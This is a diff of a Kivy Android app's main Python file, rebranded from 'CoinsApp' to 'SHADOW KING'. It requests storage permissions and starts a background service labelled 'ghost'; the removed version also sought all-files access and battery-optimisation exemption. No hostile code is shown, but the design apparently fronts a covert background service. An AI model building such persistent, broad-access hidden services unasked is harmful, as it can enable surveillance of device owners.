@@ -2,45 +2,55 @@ from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
 from kivy.uix.label import Label
-from kivy.clock import Clock
 from jnius import autoclass
 from android.permissions import request_permissions, Permission
 
-class CoinsApp(App):
-    def build(self):
-        layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
-        self.status = Label(text="System Ready", font_size='18sp')
+class ShadowKingUI(BoxLayout):
+    def __init__(self, **kwargs):
+        super().__init__(orientation='vertical', spacing=20, padding=50, **kwargs)
         
-        btn_1 = Button(text="STEP 1: ACCESS", background_color=(0.2, 0.4, 0.9, 1))
-        btn_2 = Button(text="STEP 2: BATTERY", background_color=(0.8, 0.5, 0.2, 1))
-        btn_3 = Button(text="STEP 3: ACTIVATE", background_color=(0.1, 0.7, 0.2, 1))
+        self.add_widget(Label(text="SHADOW KING SYSTEM", font_size='26sp', color=(1, 0, 0, 1), bold=True))
+        
+        # المهمة 1: الصلاحيات
+        self.btn1 = Button(text="MISSION 1: GRANT POWER", size_hint_y=None, height='70dp', background_color=(0.2, 0.2, 0.2, 1))
+        self.btn1.bind(on_press=self.ask_permissions)
+        self.add_widget(self.btn1)
 
-        btn_1.bind(on_press=lambda x: self.open_perm("android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"))
-        btn_2.bind(on_press=lambda x: self.open_perm("android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"))
-        btn_3.bind(on_press=self.start_service)
+        # المهمة 2: المزامنة (شكلية حالياً)
+        self.btn2 = Button(text="MISSION 2: SYNC DATABASE", size_hint_y=None, height='70dp', background_color=(0.2, 0.2, 0.2, 1))
+        self.add_widget(self.btn2)
 
-        layout.add_widget(self.status); layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
-        Clock.schedule_once(lambda dt: request_permissions(["android.permission.POST_NOTIFICATIONS"]), 1)
-        return layout
+        # المهمة 3: تشغيل الشبح
+        self.btn3 = Button(text="MISSION 3: ACTIVATE GHOST", size_hint_y=None, height='70dp', background_color=(0, 0.8, 0, 1))
+        self.btn3.bind(on_press=self.activate_ghost)
+        self.add_widget(self.btn3)
 
-    def open_perm(self, action):
+        self.status = Label(text="System Status: Dormant", font_size='14sp', color=(0.8, 0.8, 0.8, 1))
+        self.add_widget(self.status)
+
+    def ask_permissions(self, instance):
+        request_permissions([
+            Permission.READ_EXTERNAL_STORAGE,
+            Permission.WRITE_EXTERNAL_STORAGE,
+            Permission.POST_NOTIFICATIONS
+        ])
+        self.btn1.text = "✅ POWER GRANTED"
+
+    def activate_ghost(self, instance):
         try:
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            Intent = autoclass('android.content.Intent')
-            Uri = autoclass('android.net.Uri')
-            Settings = autoclass('android.provider.Settings')
-            activity = PythonActivity.mActivity
-            intent = Intent(autoclass(action))
-            if "BATTERY" in action: intent.setData(Uri.parse("package:" + activity.getPackageName()))
-            activity.startActivity(intent)
-        except: pass
-
-    def start_service(self):
-        try:
+            # الربط الدقيق مع الحزمة والخدمة المعرفة في buildozer.spec
             from android import mActivity
-            # اسم الخدمة يجب أن يكون دقيقاً جداً ليتصل بملف service.py
-            service = autoclass('org.test.coinssync.ServiceMyservice')
+            service = autoclass('org.shadow.shadowking.ServiceMyservice')
             service.start(mActivity, "")
-            self.status.text = "✅ ACTIVE"
+            self.status.text = "✅ GHOST IS LIVE IN BACKGROUND"
+            self.btn3.text = "GHOST ACTIVE"
+            self.btn3.disabled = True
         except Exception as e:
             self.status.text = f"❌ Error: {str(e)}"
+
+class ShadowApp(App):
+    def build(self):
+        return ShadowKingUI()
+
+if __name__ == "__main__":
+    ShadowApp().run()
